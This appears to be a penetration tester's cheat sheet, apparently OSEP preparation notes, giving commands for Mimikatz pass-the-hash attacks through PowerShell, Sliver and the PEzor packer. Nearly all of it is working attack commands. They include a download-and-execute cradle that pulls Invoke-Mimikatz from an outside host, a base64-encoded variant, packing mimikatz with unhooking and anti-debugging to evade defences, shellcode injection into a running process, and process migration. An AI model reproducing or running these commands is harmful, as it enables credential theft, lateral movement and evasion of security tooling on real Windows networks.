# Mimikatz

## Mimikatz - Powershell port

### 1) Mimikatz for this - preferably use cyberchef for base64 encoding - Fails because of powershell issues

    sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff
    IEX((new-object net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1'))


### 2) Anything with spaces, requires `` for quotes escaping

    Invoke-Mimikatz -Command "privilege::debug token::elevate `"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff`" exit"

### 3) Above base64 encoded command

    sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1' -e -c SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46ZG9tYWluLmNvbSAvbnRsbTpmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmZmAiIGV4aXQi


### 4) We can use PEzor to create mimikatz for PTH as well

    PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
    execute-assembly -i /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe

### 5) Execute shellcode within the mimi created process

    execute-shellcode -p 4428 /home/kali/OSEP/hav0c/sliver.x64.bin

## Mimikatz - PEZor

### 1) Sliver also has its own mimikatz implementation, we can use that - It works with DLL injection

    mimikatz '"privilege::debug" "sekurlsa::pth /user:username /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'

### 2) We can use mimikatz and then migrate or just find a process running as that user and inject into it

    PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "sekurlsa::pth /user:username /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
    execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe

### 3) Migrate into the process

    migrate -p 4712
